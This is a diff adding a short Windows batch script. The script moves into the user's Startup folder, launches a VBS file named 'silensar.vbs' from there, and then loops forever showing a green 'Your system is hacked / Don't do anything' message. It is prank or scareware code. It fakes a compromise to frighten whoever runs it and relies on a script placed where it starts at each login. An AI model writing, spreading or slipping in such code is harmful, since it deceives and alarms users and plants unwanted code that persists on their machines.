@@ -1,0 +1,17 @@
+@echo off
+:: run this on pc stated
+cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\"
+start silensar.vbs
+
+:typing
+cls
+mode 100, 30
+color 0a
+echo                                        Wellcome !!!
+echo                                    Your system is hacked 
+echo                                       Don't do anything
+echo.
+ping localhost -n 1 >nul     
+goto :typing
+
+exit
